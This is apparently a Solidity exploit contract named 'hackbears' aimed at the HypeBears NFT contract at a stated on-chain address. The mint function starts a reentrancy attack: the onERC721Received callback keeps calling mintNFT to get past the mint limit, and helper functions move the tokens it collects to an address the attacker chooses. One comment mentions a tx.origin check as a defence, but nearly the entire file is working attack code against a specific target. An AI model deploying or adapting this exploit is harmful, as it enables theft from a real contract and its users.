// SPDX-License-Identifier: GPL-3.0-or-later
// This contract targets the HypeBears NFT and exploits the mint limit vulnerability: 0x14e0a1F310E2B7E321c91f58847e98b8C802f6eF

pragma solidity ^0.8.4;

import "./HypeBears.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract hackbears is IERC721Receiver, Ownable {
  HypeBears hb;
  uint256 amount;
  bool complete;
  bytes sig;

//setting the contract to the HypeBears NFT
  constructor(address _implementation) payable {
    hb = HypeBears(_implementation);
  }

//Call to the mint function, will initiate re-entrancy attack, enter in any 0xbytes_that_will_suffice_the_length_of_the_call
  function beginMint(uint256 _amount_to_mint, bytes memory _signature) external onlyOwner{
    amount = _amount_to_mint;
    sig = _signature;
    hb.mintNFT{value: 400000000000000000}(amount, sig);
  }

//function that must be implemented for an external contract that is calling erc721 contract
//best way to prevent this from happening is to just limit the calls to EOA wallets only by doing a require tx.origin == msg.sender
  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) {

//the recursive call to mint
    if(address(this).balance >= 400000000000000000){
        hb.mintNFT{value: 400000000000000000}(amount, sig);
    }

    return this.onERC721Received.selector;
  }


//retrieve all token id's owned by a particular address
    function getTokenIds(address _owner) public view returns (uint[] memory) {
        uint[] memory _tokensOfOwner = new uint[](hb.balanceOf(_owner));
        uint i;

        for (i=0;i<hb.balanceOf(_owner);i++){
            _tokensOfOwner[i] = hb.tokenOfOwnerByIndex(_owner, i);
        }
        return (_tokensOfOwner);
    }

//withdraw all tokens owned by a particular address; will require to be called 3 times to transfer it all out
    function withdraw_all(address _owner, address _to) external onlyOwner {
        uint[] memory _tokensOfOwner = new uint[](hb.balanceOf(_owner));
        uint i;

        for (i=0;i<hb.balanceOf(_owner);i++){
            _tokensOfOwner[i] = hb.tokenOfOwnerByIndex(_owner, i);
            hb.safeTransferFrom(_owner, _to, _tokensOfOwner[i]);
        }

    }

    receive() external payable {}

    function balance() public view returns (uint256){

        return address(this).balance;

    }


    function transfer_one(address from, address to, uint256 token_id) external onlyOwner {

        hb.safeTransferFrom(from, to, token_id);

    }

    function approve(address to, uint256 token_id) external onlyOwner {

        hb.approve(to, token_id);

    }

}